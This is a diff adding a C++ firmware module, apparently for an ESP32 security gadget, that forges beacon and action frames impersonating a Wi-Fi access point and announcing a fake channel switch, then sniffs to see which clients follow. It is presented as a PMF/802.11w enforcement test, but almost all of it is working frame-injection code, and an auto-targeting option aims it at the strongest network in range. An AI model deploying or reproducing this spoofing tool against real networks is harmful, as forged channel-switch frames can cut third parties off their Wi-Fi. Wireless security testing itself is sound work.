diff --git a/src/modules/wifi/pmf_csa_test.cpp b/src/modules/wifi/pmf_csa_test.cpp
new file mode 100644
index 00000000..569e71f3
--- /dev/null
+++ b/src/modules/wifi/pmf_csa_test.cpp
@@ -0,0 +1,549 @@
+#include "pmf_csa_test.h"
+#if !defined(LITE_VERSION)
+
+#include "core/config.h"
+#include "core/display.h"
+#include "core/mykeyboard.h"
+#include "core/radio_mem.h"
+#include "core/seclab_util.h"
+#include "core/utils.h"
+#include "core/wifi/webInterface.h"
+#include "core/wifi/wifi_common.h"
+#include "esp_wifi.h"
+#include <Arduino.h>
+#include <LittleFS.h>
+#include <WiFi.h>
+#include <algorithm>
+#include <cstring>
+#include <globals.h>
+#include <vector>
+
+/*
+ * CSA (Channel Switch Announcement) PMF probe.
+ *
+ * Under 802.11w / PMF, unprotected management frames that claim to come from
+ * the AP (beacon/action CSA included) MUST be dropped by the client. This tool
+ * therefore spoofs a beacon + action frame with a CSA element, then listens on
+ * both the original and the advertised channel. If client data frames appear
+ * on the advertised channel, the STA accepted an unprotected CSA -- i.e. PMF
+ * is not enforced on that client/driver. No deauthentication is used.
+ */
+
+namespace {
+
+constexpr const char *kStatePath = "/csa_state.json";
+constexpr const char *kLogPath = "/csa_pmf.log";
+
+struct CsaEvent {
+    uint32_t tsSec;
+    uint8_t channel;
+    uint8_t kind; // 0 = client data, 1 = probe, 2 = mgmt from AP
+    char mac[13];
+};
+
+static portMUX_TYPE s_rxMux = portMUX_INITIALIZER_UNLOCKED;
+static SemaphoreHandle_t s_stateMux = nullptr;
+static TaskHandle_t s_task = nullptr;
+static volatile bool s_running = false;
+static volatile bool s_stopReq = false;
+
+static uint8_t s_apMac[6] = {0};
+static char s_ssid[33] = {0};
+static uint8_t s_apCh = 1;
+static uint8_t s_newCh = 1;
+static uint16_t s_bursts = 3;
+static char s_lastErr[96] = {0};
+static wifi_mode_t s_prevMode = WIFI_MODE_NULL;
+static bool s_prevSta = false;
+
+static volatile uint32_t s_framesSent = 0;
+static volatile uint32_t s_rxApCh = 0;
+static volatile uint32_t s_rxNewCh = 0;
+static volatile uint32_t s_clientOnNewCh = 0;
+static volatile uint32_t s_probeOnNewCh = 0;
+static std::vector<CsaEvent> s_events;
+static uint32_t s_startedMs = 0;
+static bool s_hopToNew = false;
+
+static void ensureStateMux() {
+    if (!s_stateMux) s_stateMux = xSemaphoreCreateMutex();
+}
+
+static void setErr(const String &e) {
+    strncpy(s_lastErr, e.c_str(), sizeof(s_lastErr) - 1);
+    s_lastErr[sizeof(s_lastErr) - 1] = 0;
+}
+
+static void IRAM_ATTR csaRxCb(void *buf, wifi_promiscuous_pkt_type_t type) {
+    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
+    if (!pkt || pkt->rx_ctrl.sig_len < 24) return;
+    const uint8_t *f = pkt->payload;
+    uint8_t ch = pkt->rx_ctrl.channel;
+    uint8_t ftype = (f[0] & 0x0C) >> 2;
+    uint8_t subtype = (f[0] >> 4) & 0x0F;
+    bool fromAp = (memcmp(f + 10, s_apMac, 6) == 0);
+
+    portENTER_CRITICAL_ISR(&s_rxMux);
+    if (ch == s_newCh) {
+        s_rxNewCh++;
+        if (type == WIFI_PKT_MGMT && subtype == 4) s_probeOnNewCh++;
+        if (type == WIFI_PKT_DATA && !fromAp) s_clientOnNewCh++;
+    } else if (ch == s_apCh) {
+        s_rxApCh++;
+    }
+    portEXIT_CRITICAL_ISR(&s_rxMux);
+}
+
+static void logEventLocked(uint8_t ch, uint8_t kind, const uint8_t mac[6]) {
+    CsaEvent e = {};
+    e.tsSec = seclabUptimeSec();
+    e.channel = ch;
+    e.kind = kind;
+    strncpy(e.mac, seclabMacHex(mac).c_str(), sizeof(e.mac) - 1);
+    if (s_events.size() >= 16) s_events.erase(s_events.begin());
+    s_events.push_back(e);
+}
+
+static size_t buildCsaBeacon(uint8_t *out, size_t cap, uint8_t newCh, uint8_t count) {
+    if (cap < 128) return 0;
+    memset(out, 0, cap);
+    size_t p = 0;
+    out[p++] = 0x80; out[p++] = 0x00;                 // Beacon
+    out[p++] = 0x00; out[p++] = 0x00;                 // duration
+    memset(out + p, 0xFF, 6); p += 6;                  // broadcast DA
+    memcpy(out + p, s_apMac, 6); p += 6;               // SA = spoofed AP
+    memcpy(out + p, s_apMac, 6); p += 6;               // BSSID
+    out[p++] = 0x00; out[p++] = 0x00;                  // seq
+    memset(out + p, 0x00, 8); p += 8;                  // timestamp
+    out[p++] = 0x64; out[p++] = 0x00;                  // beacon interval 100 TU
+    out[p++] = 0x11; out[p++] = 0x04;                  // ESS | Privacy | short preamble
+
+    size_t ssidLen = strnlen(s_ssid, 32);
+    out[p++] = 0x00; out[p++] = (uint8_t)ssidLen;
+    memcpy(out + p, s_ssid, ssidLen); p += ssidLen;
+
+    static const uint8_t rates[8] = {0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24};
+    out[p++] = 0x01; out[p++] = sizeof(rates);
+    memcpy(out + p, rates, sizeof(rates)); p += sizeof(rates);
+    out[p++] = 0x03; out[p++] = 0x01; out[p++] = s_apCh; // DS parameter set
+    // CSA element: mode 1 (quiet until switch), new channel, switch count.
+    out[p++] = 0x25; out[p++] = 0x03;
+    out[p++] = 0x01; out[p++] = newCh; out[p++] = count;
+    return p;
+}
+
+static size_t buildCsaAction(uint8_t *out, size_t cap, uint8_t newCh, uint8_t count) {
+    if (cap < 64) return 0;
+    memset(out, 0, cap);
+    size_t p = 0;
+    out[p++] = 0xD0; out[p++] = 0x00;                  // Action frame
+    out[p++] = 0x00; out[p++] = 0x00;
+    memset(out + p, 0xFF, 6); p += 6;                   // broadcast DA
+    memcpy(out + p, s_apMac, 6); p += 6;
+    memcpy(out + p, s_apMac, 6); p += 6;
+    out[p++] = 0x00; out[p++] = 0x00;
+    out[p++] = 0x00;                                   // category: spectrum management
+    out[p++] = 0x04;                                   // action: Channel Switch Announcement
+    out[p++] = 0x25; out[p++] = 0x03;                  // CSA element
+    out[p++] = 0x01; out[p++] = newCh; out[p++] = count;
+    return p;
+}
+
+static void persistStateLocked() {
+    String j = "{";
+    j += "\"running\":" + String(s_running ? "true" : "false") + ",";
+    j += "\"ssid\":\"" + seclabJsonEscape(s_ssid) + "\",";
+    j += "\"bssid\":\"" + seclabJsonEscape(seclabMacColon(s_apMac)) + "\",";
+    j += "\"apChannel\":" + String((int)s_apCh) + ",";
+    j += "\"newChannel\":" + String((int)s_newCh) + ",";
+    j += "\"bursts\":" + String((unsigned)s_bursts) + ",";
+    j += "\"lastErr\":\"" + seclabJsonEscape(s_lastErr) + "\",";
+    j += "\"framesSent\":" + String((unsigned long)s_framesSent) + ",";
+    j += "\"rxApCh\":" + String((unsigned long)s_rxApCh) + ",";
+    j += "\"rxNewCh\":" + String((unsigned long)s_rxNewCh) + ",";
+    j += "\"clientOnNewCh\":" + String((unsigned long)s_clientOnNewCh) + ",";
+    j += "\"probeOnNewCh\":" + String((unsigned long)s_probeOnNewCh) + ",";
+    j += "\"uptimeSec\":" + String(s_running ? (unsigned long)((millis() - s_startedMs) / 1000UL) : 0UL) + ",";
+    j += "\"verdict\":\"";
+    j += (s_clientOnNewCh > 0 || s_probeOnNewCh > 0) ? "CSA_FOLLOWED_PMF_WEAK" : "NO_REACTION_PMF_OK";
+    j += "\",\"events\":[";
+    for (size_t i = 0; i < s_events.size(); i++) {
+        if (i) j += ",";
+        const CsaEvent &e = s_events[i];
+        j += "{\"ts\":" + String((unsigned long)e.tsSec) + ",\"ch\":" + String((int)e.channel) +
+             ",\"kind\":" + String((int)e.kind) + ",\"mac\":\"" + e.mac + "\"}";
+    }
+    j += "]}";
+    seclabWriteState(kStatePath, j);
+}
+
+static void restoreRadio() {
+    esp_wifi_set_promiscuous_rx_cb(nullptr);
+    esp_wifi_set_promiscuous(false);
+    WiFi.mode(s_prevMode);
+    if (s_prevSta) WiFi.begin();
+}
+
+static void csaTask(void *) {
+    uint8_t beacon[160], action[80];
+    uint16_t sentBursts = 0;
+    uint32_t lastBurst = 0;
+    uint32_t lastHop = 0;
+    uint32_t lastState = 0;
+    uint32_t lastEvent = 0;
+    uint8_t watchCh = s_apCh;
+
+    esp_wifi_set_channel(s_apCh, WIFI_SECOND_CHAN_NONE);
+
+    while (!s_stopReq && sentBursts < s_bursts) {
+        // Three announcements per burst, ~one second apart, with a decreasing
+        // switch count (3 -> 2 -> 1) like a real AP would send.
+        if (millis() - lastBurst >= 950) {
+            lastBurst = millis();
+            for (uint8_t count = 3; count >= 1; count--) {
+                size_t bl = buildCsaBeacon(beacon, sizeof(beacon), s_newCh, count);
+                size_t al = buildCsaAction(action, sizeof(action), s_newCh, count);
+                if (bl) wifiRawTx(WIFI_IF_AP, beacon, (int)bl, 4);
+                if (al) wifiRawTx(WIFI_IF_AP, action, (int)al, 4);
+                s_framesSent += 2;
+                vTaskDelay(pdMS_TO_TICKS(120));
+            }
+            sentBursts++;
+        }
+
+        // Spend 30% of each 1s window on the advertised channel to see whether
+        // any STA actually followed the spoofed CSA.
+        if (millis() - lastHop >= (s_hopToNew ? 300UL : 700UL)) {
+            lastHop = millis();
+            s_hopToNew = !s_hopToNew;
+            watchCh = s_hopToNew ? s_newCh : s_apCh;
+            esp_wifi_set_channel(watchCh, WIFI_SECOND_CHAN_NONE);
+        }
+
+        if (millis() - lastEvent > 500) {
+            lastEvent = millis();
+            ensureStateMux();
+            if (xSemaphoreTake(s_stateMux, pdMS_TO_TICKS(20)) == pdTRUE) {
+                logEventLocked(watchCh, (uint8_t)(s_clientOnNewCh > 0 ? 0 : 2), s_apMac);
+                xSemaphoreGive(s_stateMux);
+            }
+        }
+        if (millis() - lastState > 1500) {
+            lastState = millis();
+            ensureStateMux();
+            if (xSemaphoreTake(s_stateMux, pdMS_TO_TICKS(50)) == pdTRUE) {
+                persistStateLocked();
+                xSemaphoreGive(s_stateMux);
+            }
+        }
+        vTaskDelay(pdMS_TO_TICKS(25));
+    }
+
+    // Keep listening a little after the last burst so slow clients are counted.
+    uint32_t grace = millis();
+    while (!s_stopReq && millis() - grace < 3000UL) {
+        vTaskDelay(pdMS_TO_TICKS(50));
+    }
+
+    restoreRadio();
+    ensureStateMux();
+    if (xSemaphoreTake(s_stateMux, pdMS_TO_TICKS(200)) == pdTRUE) {
+        persistStateLocked();
+        String verdict = (s_clientOnNewCh > 0 || s_probeOnNewCh > 0) ? "CSA_FOLLOWED_PMF_WEAK" : "NO_REACTION_PMF_OK";
+        seclabAppendLog(kLogPath, String(seclabUptimeSec()) + "," + seclabMacColon(s_apMac) + "," +
+                                      String(s_apCh) + "->" + String(s_newCh) + "," + verdict);
+        xSemaphoreGive(s_stateMux);
+    }
+    s_running = false;
+    s_task = nullptr;
+    vTaskDelete(NULL);
+}
+
+static bool startEngine(const String &bssid, const String &ssid, uint8_t apCh, uint8_t newCh,
+                        uint16_t bursts, String *errOut) {
+    if (s_running) return true;
+    if (!seclabParseMac(bssid, s_apMac)) { if (errOut) *errOut = "Invalid BSSID"; return false; }
+    if (ssid.isEmpty() || ssid.length() > 32) { if (errOut) *errOut = "SSID must be 1..32 bytes"; return false; }
+    if (apCh < 1 || apCh > 14 || newCh < 1 || newCh > 14 || apCh == newCh) {
+        if (errOut) *errOut = "Channels must be 1..14 and different";
+        return false;
+    }
+    if (!radioHasMemForWifi()) { if (errOut) *errOut = "Low DMA RAM for Wi-Fi"; return false; }
+
+    ensureStateMux();
+    strncpy(s_ssid, ssid.c_str(), sizeof(s_ssid) - 1);
+    s_ssid[sizeof(s_ssid) - 1] = 0;
+    s_apCh = apCh;
+    s_newCh = newCh;
+    s_bursts = bursts ? bursts : 1;
+    s_framesSent = s_rxApCh = s_rxNewCh = s_clientOnNewCh = s_probeOnNewCh = 0;
+    s_events.clear();
+    s_lastErr[0] = 0;
+    s_hopToNew = false;
+
+    s_prevMode = WiFi.getMode();
+    s_prevSta = WiFi.isConnected();
+    ensureWifiPlatform();
+    WiFi.mode(WIFI_AP_STA);
+    WiFi.setSleep(WIFI_PS_NONE);
+
+    wifi_promiscuous_filter_t filter = {};
+    filter.filter_mask = WIFI_PROMIS_FILTER_MASK_ALL;
+    if (esp_wifi_set_promiscuous_filter(&filter) != ESP_OK ||
+        esp_wifi_set_promiscuous_rx_cb(csaRxCb) != ESP_OK ||
+        esp_wifi_set_promiscuous(true) != ESP_OK) {
+        setErr("Promiscuous mode failed");
+        if (errOut) *errOut = s_lastErr;
+        restoreRadio();
+        return false;
+    }
+
+    s_stopReq = false;
+    s_running = true;
+    s_startedMs = millis();
+    if (xTaskCreatePinnedToCore(csaTask, "csaPmf", 4096, nullptr, 2, &s_task, 0) != pdPASS) {
+        s_running = false;
+        s_task = nullptr;
+        setErr("CSA task spawn failed");
+        if (errOut) *errOut = s_lastErr;
+        restoreRadio();
+        return false;
+    }
+    return true;
+}
+
+struct CsaAp {
+    String ssid, bssid;
+    uint8_t ch;
+    int rssi;
+};
+
+static std::vector<CsaAp> scanAps() {
+    std::vector<CsaAp> out;
+    int n = WiFi.scanNetworks(false, true);
+    if (n <= 0) { WiFi.scanDelete(); return out; }
+    for (int i = 0; i < n && (int)out.size() < 24; i++) {
+        uint8_t *b = WiFi.BSSID(i);
+        String ssid = WiFi.SSID(i);
+        if (!b || ssid.isEmpty()) continue;
+        char mac[18];
+        snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X", b[0], b[1], b[2], b[3], b[4], b[5]);
+        out.push_back({ssid, String(mac), (uint8_t)WiFi.channel(i), WiFi.RSSI(i)});
+    }
+    WiFi.scanDelete();
+    std::sort(out.begin(), out.end(), [](const CsaAp &a, const CsaAp &b) { return a.rssi > b.rssi; });
+    return out;
+}
+
+} // namespace
+
+bool csaStart(const String &bssid, const String &ssid, uint8_t apChannel, uint8_t newChannel,
+              uint16_t bursts, String *errOut) {
+    return startEngine(bssid, ssid, apChannel, newChannel, bursts, errOut);
+}
+
+bool csaStartStrongest(String *errOut) {
+    std::vector<CsaAp> aps = scanAps();
+    if (aps.empty()) { if (errOut) *errOut = "No networks in range"; return false; }
+    const CsaAp &a = aps[0];
+    uint8_t newCh = bruceConfig.seclabPlus.csaChannel;
+    if (newCh == a.ch) newCh = (uint8_t)(a.ch == 1 ? 6 : 1);
+    return startEngine(a.bssid, a.ssid, a.ch, newCh, bruceConfig.seclabPlus.csaBursts, errOut);
+}
+
+void csaStop() {
+    if (!s_running) return;
+    s_stopReq = true;
+    for (int i = 0; i < 80 && s_running; i++) vTaskDelay(pdMS_TO_TICKS(25));
+}
+
+bool csaIsRunning() { return s_running; }
+
+void csaClear() {
+    if (s_running) return;
+    ensureStateMux();
+    if (xSemaphoreTake(s_stateMux, pdMS_TO_TICKS(200)) == pdTRUE) {
+        s_events.clear();
+        s_framesSent = s_rxApCh = s_rxNewCh = s_clientOnNewCh = s_probeOnNewCh = 0;
+        s_lastErr[0] = 0;
+        persistStateLocked();
+        xSemaphoreGive(s_stateMux);
+    }
+    LittleFS.remove(kLogPath);
+}
+
+String csaGetStateJson() {
+    ensureStateMux();
+    if (xSemaphoreTake(s_stateMux, pdMS_TO_TICKS(100)) != pdTRUE) return seclabReadState(kStatePath);
+    String j = "{";
+    j += "\"running\":" + String(s_running ? "true" : "false") + ",";
+    j += "\"ssid\":\"" + seclabJsonEscape(s_ssid) + "\",";
+    j += "\"bssid\":\"" + seclabJsonEscape(seclabMacColon(s_apMac)) + "\",";
+    j += "\"apChannel\":" + String((int)s_apCh) + ",\"newChannel\":" + String((int)s_newCh) + ",";
+    j += "\"bursts\":" + String((unsigned)s_bursts) + ",";
+    j += "\"lastErr\":\"" + seclabJsonEscape(s_lastErr) + "\",";
+    j += "\"framesSent\":" + String((unsigned long)s_framesSent) + ",";
+    j += "\"rxApCh\":" + String((unsigned long)s_rxApCh) + ",";
+    j += "\"rxNewCh\":" + String((unsigned long)s_rxNewCh) + ",";
+    j += "\"clientOnNewCh\":" + String((unsigned long)s_clientOnNewCh) + ",";
+    j += "\"probeOnNewCh\":" + String((unsigned long)s_probeOnNewCh) + ",";
+    j += "\"uptimeSec\":" + String(s_running ? (unsigned long)((millis() - s_startedMs) / 1000UL) : 0UL) + ",";
+    j += "\"verdict\":\"";
+    j += (s_clientOnNewCh > 0 || s_probeOnNewCh > 0) ? "CSA_FOLLOWED_PMF_WEAK" : "NO_REACTION_PMF_OK";
+    j += "\",\"events\":[";
+    for (size_t i = 0; i < s_events.size(); i++) {
+        if (i) j += ",";
+        const CsaEvent &e = s_events[i];
+        j += "{\"ts\":" + String((unsigned long)e.tsSec) + ",\"ch\":" + String((int)e.channel) +
+             ",\"kind\":" + String((int)e.kind) + ",\"mac\":\"" + e.mac + "\"}";
+    }
+    j += "]}";
+    xSemaphoreGive(s_stateMux);
+    return j;
+}
+
+void csa_pmf_setup() {
+    cleanlyStopWebUiForWiFiFeature();
+    radioFreeBleForWifi();
+    if (!radioHasMemForWifi()) { displayError("Low DMA RAM for Wi-Fi", true); return; }
+
+    if (s_running) {
+        int runningChoice = -1;
+        options = {
+            {"Stop CSA Test", [&]() { runningChoice = 0; }},
+            {"View /csa_state.json", [&]() { runningChoice = 1; }},
+            {"Back", [&]() { runningChoice = -1; }},
+        };
+        loopOptions(options, MENU_TYPE_SUBMENU, "CSA Test Running");
+        options.clear();
+        if (runningChoice == 0) { csaStop(); displayInfo("CSA test stopped", true); }
+        else if (runningChoice == 1 && LittleFS.exists(kStatePath)) loopSD(LittleFS, false, "*", "/");
+        else if (runningChoice == 1) displayInfo("No CSA report yet", true);
+        return;
+    }
+
+    int mode = -1;
+    options = {
+        {"Start strongest AP", [&]() { mode = 0; }},
+        {"Pick scanned target...", [&]() { mode = 1; }},
+        {String("Bursts: ") + bruceConfig.seclabPlus.csaBursts, [&]() { mode = 2; }},
+        {"View /csa_state.json", [&]() { mode = 3; }},
+        {"Clear Report", [&]() { mode = 4; }},
+        {"Back", [&]() { mode = -1; }},
+    };
+    loopOptions(options, MENU_TYPE_SUBMENU, "CSA / PMF Test");
+    options.clear();
+
+    if (mode == 2) {
+        String v = num_keyboard(String(bruceConfig.seclabPlus.csaBursts), 2, "CSA bursts (1-20)");
+        if (v != "\x1B" && !v.isEmpty()) {
+            long n = v.toInt();
+            if (n < 1) n = 1;
+            if (n > 20) n = 20;
+            bruceConfig.seclabPlus.csaBursts = (uint16_t)n;
+            bruceConfig.validateSecLabPlus();
+            bruceConfig.saveFile();
+            displayInfo(String("CSA bursts: ") + bruceConfig.seclabPlus.csaBursts, true);
+        }
+        return;
+    }
+    if (mode == 3) {
+        if (LittleFS.exists(kStatePath)) loopSD(LittleFS, false, "*", "/");
+        else displayInfo("No CSA report yet", true);
+        return;
+    }
+    if (mode == 4) { csaClear(); displayInfo("CSA state and log cleared", true); return; }
+    if (mode != 0 && mode != 1) return;
+
+    String err;
+    if (mode == 0) {
+        if (!csaStartStrongest(&err)) {
+            displayError("Start failed: " + err, true);
+            return;
+        }
+    } else {
+        displayTextLine("Scanning APs...");
+        std::vector<CsaAp> aps = scanAps();
+        if (aps.empty()) { displayWarning("No networks in range", true); return; }
+
+        int pick = -1;
+        options.clear();
+        for (size_t i = 0; i < aps.size(); i++) {
+            options.push_back({aps[i].ssid.substring(0, 16) + " CH" + String(aps[i].ch) + " " +
+                                   String(aps[i].rssi) + "dB",
+                               [&, i]() { pick = (int)i; }});
+        }
+        options.push_back({"Cancel", [&]() { pick = -1; }});
+        loopOptions(options, MENU_TYPE_SUBMENU, "CSA / PMF target");
+        options.clear();
+        if (pick < 0 || pick >= (int)aps.size()) return;
+
+        const CsaAp &a = aps[pick];
+        uint8_t newCh = bruceConfig.seclabPlus.csaChannel;
+        if (newCh == a.ch) newCh = (uint8_t)(a.ch == 1 ? 6 : 1);
+        int chChoice = -2;
+        options = {
+            {"Auto CH " + String(newCh), [&]() { chChoice = (int)newCh; }},
+            {"Channel 1", [&]() { chChoice = 1; }},
+            {"Channel 6", [&]() { chChoice = 6; }},
+            {"Channel 11", [&]() { chChoice = 11; }},
+            {"Cancel", [&]() { chChoice = -1; }},
+        };
+        loopOptions(options, MENU_TYPE_SUBMENU, "Spoofed new channel");
+        options.clear();
+        if (chChoice < 0) return;
+        newCh = (uint8_t)chChoice;
+        if (newCh == a.ch) { displayWarning("New channel must differ from AP", true); return; }
+        bruceConfig.seclabPlus.csaChannel = newCh;
+        bruceConfig.validateSecLabPlus();
+        bruceConfig.saveFile();
+
+        drawMainBorderWithTitle("CSA / PMF TEST");
+        padprintln("Only test networks you own.");
+        padprintln("No deauth frames are sent.");
+        padprintln("Target: " + a.ssid);
+        padprintln("CH " + String(a.ch) + " -> " + String(newCh));
+        if (!csaStart(a.bssid, a.ssid, a.ch, newCh, bruceConfig.seclabPlus.csaBursts, &err)) {
+            displayError("Start failed: " + err, true);
+            return;
+        }
+    }
+
+    uint32_t lastDraw = 0;
+    returnToMenu = false;
+    while (s_running && !returnToMenu) {
+        if (check(EscPress)) { csaStop(); break; }
+        if (millis() - lastDraw > 400) {
+            lastDraw = millis();
+            drawMainBorderWithTitle("CSA / PMF TEST");
+            padprintln("SSID : " + String(s_ssid));
+            padprintln("AP   : " + seclabMacColon(s_apMac));
+            padprintln("CH   : " + String(s_apCh) + " -> " + String(s_newCh));
+            padprintln("Sent : " + String((unsigned long)s_framesSent));
+            padprintln("Rx AP/New: " + String((unsigned long)s_rxApCh) + " / " +
+                       String((unsigned long)s_rxNewCh));
+            padprintln("Client on new CH: " + String((unsigned long)s_clientOnNewCh));
+            padprintln("");
+            padprintln(s_running ? "Listening... Hold Boot to stop" : "Test finished");
+        }
+        vTaskDelay(pdMS_TO_TICKS(30));
+    }
+    String j = csaGetStateJson();
+    if (j.indexOf("CSA_FOLLOWED") >= 0) {
+        displayWarning("Clients followed spoofed CSA!\nPMF not enforced on those STAs.", true);
+    } else {
+        displaySuccess("No client followed CSA.\nPMF/802.11w appears effective.", true);
+    }
+}
+
+#else  // LITE_VERSION
+
+void csa_pmf_setup() {}
+bool csaStart(const String &, const String &, uint8_t, uint8_t, uint16_t, String *) { return false; }
+bool csaStartStrongest(String *errOut) { if (errOut) *errOut = "LITE build"; return false; }
+void csaStop() {}
+bool csaIsRunning() { return false; }
+String csaGetStateJson() { return "{}"; }
+void csaClear() {}
+
+#endif
